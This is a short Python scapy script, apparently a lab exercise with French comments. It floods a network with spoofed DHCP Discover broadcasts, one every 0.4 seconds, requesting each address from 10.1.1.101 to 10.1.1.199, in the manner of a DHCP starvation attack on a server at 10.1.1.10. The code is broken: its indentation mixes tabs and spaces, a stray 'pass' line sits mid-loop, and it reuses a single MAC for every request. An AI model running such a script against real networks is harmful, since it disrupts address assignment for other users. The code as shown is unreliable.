from scapy.all import *
from time import sleep
import ipaddress

conf.checkIPaddr = False
possible_ips = [f"10.1.1.{i}" for i in range(101, 200)]

for ip_add in possible_ips:
    # Build DHCP Discover Packet
    # En source, une MAC aleatoire et destination ff:ff:ff:ff:ff:ff pour demander a tout le monde
    broadcast = Ether(src="00:15:5d:01:01:01", dst="ff:ff:ff:ff:ff:ff")
    # Creation du paquet IP en respectant la nomenclature requete DHCP 
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    # Ports utilises pour les requetes DHCP
	udp = UDP(sport=68, dport=67)
    # Requete DHCP avec une MAC aleatoire
    bootp = BOOTP(op=1,chaddr = mac2str("00:15:5d:01:01:01"))
    	pass
	# Envoie une requete DHCP Discover pour demander l'attribution de l'IP "ip_add" 
	# (ex: 10.1.1.101, 10.1.1.102...) au serveur DHCP 10.1.1.10.
	dhcp = DHCP(options=[
    	("message-type", "discover"),  # Indique qu'il s'agit d'une requete DHCP Discover
    	("requested_addr", ip_add),    # Demande l'attribution de l'adresse IP specifique "ip_add"
#    	("server-id", "10.1.1.10"),    # Specifie le serveur DHCP cible (10.1.1.10)
    	("end", "")                    # Marque la fin des options DHCP
	])
    # Creation de la trame
    pkt = broadcast / ip / udp / bootp / dhcp

    #Utilisation de "sendp" car on manipule la trame, demande des droits privilegiers
    sendp(pkt,iface='eth0', verbose=0)
    # Envoyer des demandes toutes les 0.4s
    sleep(0.4)
    print(f"Sending packet - {ip_add}")